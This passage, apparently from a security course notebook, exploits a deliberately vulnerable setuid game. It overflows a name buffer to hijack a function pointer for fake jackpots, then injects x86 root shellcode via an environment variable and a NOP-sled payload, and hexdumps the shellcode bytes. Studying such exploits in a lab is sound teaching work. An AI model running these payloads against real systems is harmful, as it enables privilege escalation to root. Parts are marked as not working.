   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/home/kali/projects/SoftwareSecurity/demos/other_overflow'"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "%pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-=[ Lucky 7 Game Menu ]=-\n",
      "1 - Play Lucky 7 game\n",
      "2 - Play Lucky 777 game\n",
      "3 - Play Lucky 77777 game\n",
      "4 - View your total credits\n",
      "5 - Change your user name\n",
      "6 - Reset your account at 500 credits\n",
      "7 - Quit\n",
      "[Name: 1                                                                                                   ]\n",
      "[You have 59930 credits] ->  Enter your choice [1-7]: \n",
      "~*~*~ Lucky 7 ~*~*~\n",
      "Costs 10 credits to play this game.\n",
      "Machine will generate 1 random number between 1 and 9.\n",
      "If the number is 7, you win a jackpot of 10 THOUSAND.\n",
      "Otherwise, you lose.\n",
      "\n",
      "\n",
      "[DEBUG] current_game pointer 0x0804b07c\n",
      "the random number is: 1 \n",
      "Sorry! Better luck next time...\n",
      "\n",
      "You have 59920 credits\n",
      "Would you like to play again? [y/n]: \n",
      "[DEBUG] current_game pointer 0x0804b07c\n",
      "the random number is: 6 \n",
      "Sorry! Better luck next time...\n",
      "\n",
      "You have 59910 credits\n",
      "Would you like to play again? [y/n]: -=[ Lucky 7 Game Menu ]=-\n",
      "1 - Play Lucky 7 game\n",
      "2 - Play Lucky 777 game\n",
      "3 - Play Lucky 77777 game\n",
      "4 - View your total credits\n",
      "5 - Change your user name\n",
      "6 - Reset your account at 500 credits\n",
      "7 - Quit\n",
      "[Name: 1                                                                                                   |�]\n",
      "[You have 59910 credits] ->  Enter your choice [1-7]: \n",
      "Thanks for playing! Good Bye.\n"
     ]
    }
   ],
   "source": [
    "! python -c 'print(\"1\\ny\\nn\\n7\")' | ./lucky7.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-=[ Lucky 7 Game Menu ]=-\n",
      "1 - Play Lucky 7 game\n",
      "2 - Play Lucky 777 game\n",
      "3 - Play Lucky 77777 game\n",
      "4 - View your total credits\n",
      "5 - Change your user name\n",
      "6 - Reset your account at 500 credits\n",
      "7 - Quit\n",
      "[Name: 1                                                                                                   ]\n",
      "[You have 59910 credits] ->  Enter your choice [1-7]: \n",
      "~*~*~ Lucky 7 ~*~*~\n",
      "Costs 10 credits to play this game.\n",
      "Machine will generate 1 random number between 1 and 9.\n",
      "If the number is 7, you win a jackpot of 10 THOUSAND.\n",
      "Otherwise, you lose.\n",
      "\n",
      "\n",
      "[DEBUG] current_game pointer 0x0804b07c\n",
      "the random number is: 4 \n",
      "Sorry! Better luck next time...\n",
      "\n",
      "You have 59900 credits\n",
      "Would you like to play again? [y/n]: -=[ Lucky 7 Game Menu ]=-\n",
      "1 - Play Lucky 7 game\n",
      "2 - Play Lucky 777 game\n",
      "3 - Play Lucky 77777 game\n",
      "4 - View your total credits\n",
      "5 - Change your user name\n",
      "6 - Reset your account at 500 credits\n",
      "7 - Quit\n",
      "[Name: 1                                                                                                   |�]\n",
      "[You have 59900 credits] ->  Enter your choice [1-7]: \n",
      "Change user name\n",
      "Enter your new name:\n",
      "Your name has been changed.\n",
      "\n",
      "-=[ Lucky 7 Game Menu ]=-\n",
      "1 - Play Lucky 7 game\n",
      "2 - Play Lucky 777 game\n",
      "3 - Play Lucky 77777 game\n",
      "4 - View your total credits\n",
      "5 - Change your user name\n",
      "6 - Reset your account at 500 credits\n",
      "7 - Quit\n",
      "[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB]\n",
      "[You have 59900 credits] ->  Enter your choice [1-7]: \n",
      "[DEBUG] current_game pointer 0x42424242\n"
     ]
    }
   ],
   "source": [
    "# let's replace the current_game with our own data (BBBB)\n",
    "! python -c 'print(\"1\\nn\\n5\\n\" + \"A\"*100 + \"BBBB\\n\" + \"1\\nn\\n7\")' | ./lucky7.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0804beab T _Z10jackpot10Kv\n",
      "0804bef8 T _Z11jackpot100Kv\n",
      "0804bf45 T _Z9jackpot1Mv\n"
     ]
    }
   ],
   "source": [
    "# note the jackpot()'s address\n",
    "! nm ./lucky7.exe | grep jackpot"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1\n",
      "n\n",
      "5\n",
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��\n",
      "1\n",
      "n\n",
      "7\n"
     ]
    }
   ],
   "source": [
    "# let's create a string mimicking game play with jackpot100K address!\n",
    "! python -c 'import sys; sys.stdout.buffer.write(b\"1\\nn\\n5\\n\" + b\"A\"*100 + b\"\\xf8\\xbe\\x04\\x08\\n\" + b\"1\\nn\\n7\\n\")'\n",
    "# the following is the sequnce of user input to play the game"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-=[ Lucky 7 Game Menu ]=-\n",
      "1 - Play Lucky 7 game\n",
      "2 - Play Lucky 777 game\n",
      "3 - Play Lucky 77777 game\n",
      "4 - View your total credits\n",
      "5 - Change your user name\n",
      "6 - Reset your account at 500 credits\n",
      "7 - Quit\n",
      "[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]\n",
      "[You have 109280 credits] ->  Enter your choice [1-7]: \n",
      "~*~*~ Lucky 7 ~*~*~\n",
      "Costs 10 credits to play this game.\n",
      "Machine will generate 1 random numbers each between 1 and 9.\n",
      "If the number is 7, you win a jackpot of 10 THOUSAND\n",
      "Otherwise, you lose.\n",
      "\n",
      "\n",
      "[DEBUG] current_game pointer 0x0804b0c1\n",
      "the random number is: 5 \n",
      "Sorry! Better luck next time...\n",
      "\n",
      "You have 109270 credits\n",
      "Would you like to play again? [y/n]: -=[ Lucky 7 Game Menu ]=-\n",
      "1 - Play Lucky 7 game\n",
      "2 - Play Lucky 777 game\n",
      "3 - Play Lucky 77777 game\n",
      "4 - View your total credits\n",
      "5 - Change your user name\n",
      "6 - Reset your account at 500 credits\n",
      "7 - Quit\n",
      "[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]\n",
      "[You have 109270 credits] ->  Enter your choice [1-7]: \n",
      "Change user name\n",
      "Enter your new name:\n",
      "Your name has been changed.\n",
      "\n",
      "-=[ Lucky 7 Game Menu ]=-\n",
      "1 - Play Lucky 7 game\n",
      "2 - Play Lucky 777 game\n",
      "3 - Play Lucky 77777 game\n",
      "4 - View your total credits\n",
      "5 - Change your user name\n",
      "6 - Reset your account at 500 credits\n",
      "7 - Quit\n",
      "[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]\n",
      "[You have 109270 credits] ->  Enter your choice [1-7]: \n",
      "[DEBUG] current_game pointer 0x0804bfb8\n",
      "*+*+*+*+*+* JACKPOT 100 THOSAND *+*+*+*+*+*\n",
      "Congratulations!!!!\n",
      " You have won the jackpot of 100000 (100K) credits!\n",
      "Sorry! Better luck next time...\n",
      "\n",
      "You have 209270 credits\n",
      "Would you like to play again? [y/n]: -=[ Lucky 7 Game Menu ]=-\n",
      "1 - Play Lucky 7 game\n",
      "2 - Play Lucky 777 game\n",
      "3 - Play Lucky 77777 game\n",
      "4 - View your total credits\n",
      "5 - Change your user name\n",
      "6 - Reset your account at 500 credits\n",
      "7 - Quit\n",
      "[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]\n",
      "[You have 209270 credits] ->  Enter your choice [1-7]: \n",
      "Thanks for playing! Good Bye.\n"
     ]
    }
   ],
   "source": [
    "# now let's hit the Jackpot to receive 100K credit!\n",
    "! python -c 'import sys; sys.stdout.buffer.write(b\"1\\nn\\n5\\n\" + b\"A\"*100 + b\"\\xb8\\xbf\\x04\\x08\\n\" + b\"1\\nn\\n7\\n\")' | ./lucky7.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-=[ Lucky 7 Game Menu ]=-\n",
      "1 - Play Lucky 7 game\n",
      "2 - Play Lucky 777 game\n",
      "3 - Play Lucky 77777 game\n",
      "4 - View your total credits\n",
      "5 - Change your user name\n",
      "6 - Reset your account at 500 credits\n",
      "7 - Quit\n",
      "[Name: John Smith                                                                                          ]\n",
      "[You have 609200 credits] ->  Enter your choice [1-7]: \n",
      "~*~*~ Lucky 7 ~*~*~\n",
      "Costs 10 credits to play this game.\n",
      "Machine will generate 1 random numbers each between 1 and 9.\n",
      "If the number is 7, you win a jackpot of 10 THOUSAND\n",
      "Otherwise, you lose.\n",
      "\n",
      "\n",
      "[DEBUG] current_game pointer 0x0804b0c1\n",
      "the random number is: 9 \n",
      "Sorry! Better luck next time...\n",
      "\n",
      "You have 609190 credits\n",
      "Would you like to play again? [y/n]: -=[ Lucky 7 Game Menu ]=-\n",
      "1 - Play Lucky 7 game\n",
      "2 - Play Lucky 777 game\n",
      "3 - Play Lucky 77777 game\n",
      "4 - View your total credits\n",
      "5 - Change your user name\n",
      "6 - Reset your account at 500 credits\n",
      "7 - Quit\n",
      "[Name: John Smith                                                                                          ��]\n",
      "[You have 609190 credits] ->  Enter your choice [1-7]: \n",
      "Change user name\n",
      "Enter your new name:\n",
      "Your name has been changed.\n",
      "\n",
      "-=[ Lucky 7 Game Menu ]=-\n",
      "1 - Play Lucky 7 game\n",
      "2 - Play Lucky 777 game\n",
      "3 - Play Lucky 77777 game\n",
      "4 - View your total credits\n",
      "5 - Change your user name\n",
      "6 - Reset your account at 500 credits\n",
      "7 - Quit\n",
      "[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]\n",
      "[You have 609190 credits] ->  Enter your choice [1-7]: \n",
      "[DEBUG] current_game pointer 0x0804bfb8\n",
      "*+*+*+*+*+* JACKPOT 100 THOSAND *+*+*+*+*+*\n",
      "Congratulations!!!!\n",
      " You have won the jackpot of 100000 (100K) credits!\n",
      "Sorry! Better luck next time...\n",
      "\n",
      "You have 709190 credits\n",
      "Would you like to play again? [y/n]: \n",
      "[DEBUG] current_game pointer 0x0804bfb8\n",
      "*+*+*+*+*+* JACKPOT 100 THOSAND *+*+*+*+*+*\n",
      "Congratulations!!!!\n",
      " You have won the jackpot of 100000 (100K) credits!\n",
      "Sorry! Better luck next time...\n",
      "\n",
      "You have 809190 credits\n",
      "Would you like to play again? [y/n]: -=[ Lucky 7 Game Menu ]=-\n",
      "1 - Play Lucky 7 game\n",
      "2 - Play Lucky 777 game\n",
      "3 - Play Lucky 77777 game\n",
      "4 - View your total credits\n",
      "5 - Change your user name\n",
      "6 - Reset your account at 500 credits\n",
      "7 - Quit\n",
      "[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]\n",
      "[You have 809190 credits] ->  Enter your choice [1-7]: \n",
      "Change user name\n",
      "Enter your new name:\n",
      "Your name has been changed.\n",
      "\n",
      "-=[ Lucky 7 Game Menu ]=-\n",
      "1 - Play Lucky 7 game\n",
      "2 - Play Lucky 777 game\n",
      "3 - Play Lucky 77777 game\n",
      "4 - View your total credits\n",
      "5 - Change your user name\n",
      "6 - Reset your account at 500 credits\n",
      "7 - Quit\n",
      "[Name: John Smith]\n",
      "[You have 809190 credits] ->  Enter your choice [1-7]: \n",
      "~*~*~ Lucky 777 ~*~*~\n",
      "Costs 50 credits to play this game.\n",
      "Machine will generate 3 random numbers each between 1 and 9.\n",
      "If all 3 numbers are 7, you win a jackpot of 100 THOUSAND\n",
      "If all 3 numbers match, you win 10 THOUSAND\n",
      "Otherwise, you lose.\n",
      " Enter to continue...\n",
      "\n",
      "[DEBUG] current_game pointer 0x0804b14d\n",
      "3 random numers are: 3 4 4 \n",
      "Sorry! Better luck next time...\n",
      "\n",
      "You have 809140 credits\n",
      "Would you like to play again? [y/n]: -=[ Lucky 7 Game Menu ]=-\n",
      "1 - Play Lucky 7 game\n",
      "2 - Play Lucky 777 game\n",
      "3 - Play Lucky 77777 game\n",
      "4 - View your total credits\n",
      "5 - Change your user name\n",
      "6 - Reset your account at 500 credits\n",
      "7 - Quit\n",
      "[Name: John Smith]\n",
      "[You have 809140 credits] ->  Enter your choice [1-7]: \n",
      "Thanks for playing! Good Bye.\n"
     ]
    }
   ],
   "source": [
    "# let's hit the Jackpot 2 times in a row!\n",
    "# and change to your actual name\n",
    "# now let's hit the Jackpot!\n",
    "! python -c 'import sys; sys.stdout.buffer.write(b\"1\\nn\\n5\\n\" + b\"A\"*100 + b\"\\xb8\\xbf\\x04\\x08\\n\" + b\"1\\ny\\nn\\n5\\nJohn Smith\\n2\\nn\\n7\\n\")' | ./lucky7.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exploiting with shellcode\n",
    "\n",
    "### Stashing Shellcode as Environment Varaible\n",
    "- compile `getenvaddr.cpp` file as 32-bit binary"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "! g++ -m32 -o getenvaddr.exe getenvaddr.cpp"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- export `/shellcode/shellcode_root.bin` as an env variable\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/EthicalHacking/demos/other_overflow]\n",
    "└─$ export SHELLCODE=$(cat ../../shellcode/shellcode_root.bin)\n",
    "\n",
    "┌──(kali㉿K)-[~/projects/EthicalHacking/demos/other_overflow]\n",
    "└─$ ./getenvaddr.exe SHELLCODE ./lucky7.exe                                                                                \n",
    "SHELLCODE will be at 0xffffdf80 with reference to ./lucky7.exe\n",
    "\n",
    "┌──(kali㉿K)-[~/projects/EthicalHacking/demos/other_overflow]\n",
    "└─$ python -c 'import sys; sys.stdout.buffer.write(b\"1\\nn\\n5\\n\" + b\"A\"*100 + b\"\\x80\\xdf\\xff\\xff\\n\" + b\"1\\n\")' > env_exploit\n",
    "\n",
    "┌──(kali㉿K)-[~/projects/EthicalHacking/demos/other_overflow]\n",
    "└─$ cat env_exploit - | ./lucky7.exe                                                                             \n",
    "-=[ Lucky 7 Game Menu ]=-\n",
    "1 - Play Lucky 7 game\n",
    "2 - Play Lucky 777 game\n",
    "3 - Play Lucky 77777 game\n",
    "4 - View your total credits\n",
    "5 - Change your user name\n",
    "6 - Reset your account at 500 credits\n",
    "7 - Quit\n",
    "[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]\n",
    "[You have 858770 credits] ->  Enter your choice [1-7]: \n",
    "~*~*~ Lucky 7 ~*~*~\n",
    "Costs 10 credits to play this game.\n",
    "Machine will generate 1 random numbers each between 1 and 9.\n",
    "If the number is 7, you win a jackpot of 10 THOUSAND\n",
    "Otherwise, you lose.\n",
    "\n",
    "\n",
    "[DEBUG] current_game pointer 0x0804b0bf\n",
    "the random number is: 4 \n",
    "Sorry! Better luck next time...\n",
    "\n",
    "You have 858760 credits\n",
    "Would you like to play again? [y/n]: -=[ Lucky 7 Game Menu ]=-\n",
    "1 - Play Lucky 7 game\n",
    "2 - Play Lucky 777 game\n",
    "3 - Play Lucky 77777 game\n",
    "4 - View your total credits\n",
    "5 - Change your user name\n",
    "6 - Reset your account at 500 credits\n",
    "7 - Quit\n",
    "[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�]\n",
    "[You have 858760 credits] ->  Enter your choice [1-7]: \n",
    "Change user name\n",
    "Enter your new name:\n",
    "Your name has been changed.\n",
    "\n",
    "-=[ Lucky 7 Game Menu ]=-\n",
    "1 - Play Lucky 7 game\n",
    "2 - Play Lucky 777 game\n",
    "3 - Play Lucky 77777 game\n",
    "4 - View your total credits\n",
    "5 - Change your user name\n",
    "6 - Reset your account at 500 credits\n",
    "7 - Quit\n",
    "[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����]\n",
    "[You have 858760 credits] ->  Enter your choice [1-7]: \n",
    "[DEBUG] current_game pointer 0xffffdf80\n",
    "whoami\n",
    "root\n",
    "exit\n",
    "\n",
    "```\n",
    "\n",
    "- congratulations on getting your shellcode executed!!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Smuggling Shellcode into Program's Buffer\n",
    "### Note: not working!!!\n",
    "\n",
    "- as the program is setuid; it \"should\" give you a root shell if you can manage to smuggle and execute root shellcode!\n",
    "- goal is to overwrite `player.name` with shellcode\n",
    "- overflow the `player.current_game` attribute with the address of the smuggled shellcode\n",
    "    - NOTE: we're not overflowing the return address, though you could!\n",
    "- find the address of `player.name` attribute using gdb\n",
    "- run `lucky7.exe` game from a terminal\n",
    "- from another terminal finds its pid\n",
    "\n",
    "```bash\n",
    "# Terminal 1\n",
    "┌──(kali㉿K)-[~/projects/EthicalHacking/demos/other_overflow]\n",
    "└─$ ./lucky7.exe \n",
    "-=[ Lucky 7 Game Menu ]=-\n",
    "1 - Play Lucky 7 game\n",
    "2 - Play Lucky 777 game\n",
    "3 - Play Lucky 77777 game\n",
    "4 - View your total credits\n",
    "5 - Change your user name\n",
    "6 - Reset your account at 500 credits\n",
    "7 - Quit\n",
    "[Name: John Smith                                                                                          ]\n",
    "[You have 809140 credits] ->  Enter your choice [1-7]: \n",
    "\n",
    "#Terminal 2\n",
    "\n",
    "┌──(kali㉿K)-[~]\n",
    "└─$ ps aux | grep lucky7.exe\n",
    "root        2639  0.0  0.0   5476  1264 pts/2    S+   15:01   0:00 ./lucky7.exe\n",
    "kali        2932  0.0  0.0   6320   660 pts/3    S+   15:01   0:00 grep --color=auto lucky7.exe\n",
    "\n",
    "\n",
    "┌──(kali㉿K)-[~]\n",
    "└─$ sudo gdb -q --pid=2639\n",
    "[sudo] password for kali: \n",
    "Attaching to process 2639\n",
    "Reading symbols from /home/kali/projects/EthicalHacking/demos/other_overflow/lucky7.exe...\n",
    "Reading symbols from /lib32/libstdc++.so.6...\n",
    "(No debugging symbols found in /lib32/libstdc++.so.6)\n",
    "Reading symbols from /lib32/libgcc_s.so.1...\n",
    "(No debugging symbols found in /lib32/libgcc_s.so.1)\n",
    "Reading symbols from /lib32/libc.so.6...\n",
    "(No debugging symbols found in /lib32/libc.so.6)\n",
    "Reading symbols from /lib32/libm.so.6...\n",
    "(No debugging symbols found in /lib32/libm.so.6)\n",
    "Reading symbols from /lib/ld-linux.so.2...\n",
    "(No debugging symbols found in /lib/ld-linux.so.2)\n",
    "0xf7fcb559 in __kernel_vsyscall ()\n",
    "warning: File \"/home/kali/.gdbinit\" auto-loading has been declined by your `auto-load safe-path' set to \"$debugdir:$datadir/auto-load\".\n",
    "To enable execution of this file add\n",
    "        add-auto-load-safe-path /home/kali/.gdbinit\n",
    "line to your configuration file \"/root/.gdbinit\".\n",
    "To completely disable this security protection add\n",
    "        set auto-load safe-path /\n",
    "line to your configuration file \"/root/.gdbinit\".\n",
    "For more information about this security protection see the\n",
    "\"Auto-loading safe path\" section in the GDB manual.  E.g., run from the shell:\n",
    "        info \"(gdb)Auto-loading safe path\"\n",
    "(gdb) p/x &player.name\n",
    "$1 = 0x8050128\n",
    "(gdb) p/x &player.current_game\n",
    "$2 = 0x805018c\n",
    "(gdb) p/u 0x805018c - 0x8050128\n",
    "$3 = 100\n",
    "(gdb)\n",
    "(gdb) quit\n",
    "\n",
    "\n",
    "```\n",
    "- so the address of `player.name` is 0x8050128\n",
    "- the offset to overwrite `player.current_game` from `player.name` is 100!\n",
    "- exploit code should look like this: [NOP sled | shellcode | SHELLCODE_ADDRESS]\n",
    "- NOP sled + shellcode should be 100 bytes long\n",
    "- let's find the length of the root shellcode in `shellcode` folder\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/home/kali/projects/EthicalHacking'"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "%pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/kali/projects/EthicalHacking/demos/other_overflow\n"
     ]
    }
   ],
   "source": [
    "%cd ./demos/other_overflow"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "35 ../../shellcode/shellcode_root.bin\n"
     ]
    }
   ],
   "source": [
    "! wc -c ../../shellcode/shellcode_root.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "65"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# total NOP sled\n",
    "100 - 35"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's write NOP sled to a binary file\n",
    "! python -c 'import sys; sys.stdout.buffer.write(b\"\\x90\"*65)' > ./lucky7_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "65 ./lucky7_exploit.bin\n"
     ]
    }
   ],
   "source": [
    "! wc -c ./lucky7_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "# lets append shellcode to the exploitcode\n",
    "! cat ../../shellcode/shellcode_root.bin >> ./lucky7_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "100 ./lucky7_exploit.bin\n"
     ]
    }
   ],
   "source": [
    "# let's check the size of exploit code\n",
    "! wc -c ./lucky7_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x8050141\n"
     ]
    }
   ],
   "source": [
    "print(hex(0x08050128 + 25))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's append the address of player.name: 0x8050128\n",
    "! python -c 'import sys; sys.stdout.buffer.write(b\"\\x41\\x01\\x05\\x08\\n\")' >> ./lucky7_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|\n",
      "*\n",
      "00000040  90 31 c0 31 db 31 c9 99  b0 a4 cd 80 6a 0b 58 51  |.1.1.1......j.XQ|\n",
      "00000050  68 2f 2f 73 68 68 2f 62  69 6e 89 e3 51 89 e2 53  |h//shh/bin..Q..S|\n",
      "00000060  89 e1 cd 80 41 01 05 08  0a                       |....A....|\n",
      "00000069\n"
     ]
    }
   ],
   "source": [
    "! hexdump -C ./lucky7_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "105 ./lucky7_exploit.bin\n"
     ]
    }
   ],
   "source": [
    "# let's check the size of exploit code\n",
    "! wc -c ./lucky7_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [],
   "source": [
    "! python -c 'import sys; sys.stdout.buffer.write(b\"1\\nn\\n5\\n\")' > lucky7_final_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000  31 0a 6e 0a 35 0a                                 |1.n.5.|\n",
      "00000006\n"
     ]
    }
   ],
   "source": [
    "! hexdump -C lucky7_final_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat lucky7_exploit.bin >> lucky7_final_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [],
   "source": [
    "! python -c 'import sys; sys.stdout.buffer.write(b\"1\\n\")' >> lucky7_final_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "116 ./exploit_game.bin\n"
     ]
    }
   ],
   "source": [
    "! wc -c ./exploit_game.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000  31 0a 6e 0a 35 0a 90 90  90 90 90 90 90 90 90 90  |1.n.5...........|\n",
      "00000010  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|\n",
      "*\n",
      "00000040  90 90 90 90 90 90 90 31  c0 31 db 31 c9 99 b0 a4  |.......1.1.1....|\n",
      "00000050  cd 80 6a 0b 58 51 68 2f  2f 73 68 68 2f 62 69 6e  |..j.XQh//shh/bin|\n",
      "00000060  89 e3 51 89 e2 53 89 e1  cd 80 41 01 05 08 0a 31  |..Q..S....A....1|\n",
      "00000070  0a                                                |.|\n",
      "00000071\n"
     ]
    }
   ],
   "source": [
    "! hexdump -C ./lucky7_final_exploit.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- exploit the program with the final exploit created\n",
    "\n",
    "``` \n",
    "$ cat lucky7_final_exploit.bin - | ./lucky7.exe\n",
    "```\n",
    "\n",
    "- NOTICE: the hyphen after the exploit\n",
    "- tells the cat program to send standard input after the exploit buffer, returning control of the input\n",
    "- eventhough the shell doesn't display its prompt, it is still accessible\n",
    "- stash both and user and root shell and force the program execute them\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/EthicalHacking/demos/other_overflow]\n",
    "└─$ cat lucky7_final_exploit.bin - | ./lucky7.exe    \n",
    "-=[ Lucky 7 Game Menu ]=-\n",
    "1 - Play Lucky 7 game\n",
    "2 - Play Lucky 777 game\n",
    "3 - Play Lucky 77777 game\n",
    "4 - View your total credits\n",
    "5 - Change your user name\n",
    "6 - Reset your account at 500 credits\n",
    "7 - Quit\n",
    "[Name: ��������������������������������������������������������1����$h/zsh/binh/usr                      ]\n",
    "[You have 918420 credits] ->  Enter your choice [1-7]: \n",
    "~*~*~ Lucky 7 ~*~*~\n",
    "Costs 10 credits to play this game.\n",
    "Machine will generate 1 random numbers each between 1 and 9.\n",
    "If the number is 7, you win a jackpot of 10 THOUSAND\n",
    "Otherwise, you lose.\n",
    "\n",
    "\n",
    "[DEBUG] current_game pointer 0x0804b0bf\n",
    "the random number is: 7 \n",
    "*+*+*+*+*+* JACKPOT 10 THOUSAND *+*+*+*+*+*\n",
    "Congratulations!\n",
    " You have won the jackpot of 10000 (10K) credits!\n",
    "\n",
    "You have 928410 credits\n",
    "Would you like to play again? [y/n]: -=[ Lucky 7 Game Menu ]=-\n",
    "1 - Play Lucky 7 game\n",
    "2 - Play Lucky 777 game\n",
    "3 - Play Lucky 77777 game\n",
    "4 - View your total credits\n",
    "5 - Change your user name\n",
    "6 - Reset your account at 500 credits\n",
    "7 - Quit\n",
    "[Name: ��������������������������������������������������������1����$h/zsh/binh/usr                      �]\n",
    "[You have 928410 credits] ->  Enter your choice [1-7]: \n",
    "Change user name\n",
    "Enter your new name:\n",
    "Your name has been changed.\n",
    "\n",
    "-=[ Lucky 7 Game Menu ]=-\n",
    "1 - Play Lucky 7 game\n",
    "2 - Play Lucky 777 game\n",
    "3 - Play Lucky 77777 game\n",
    "4 - View your total credits\n",
    "5 - Change your user name\n",
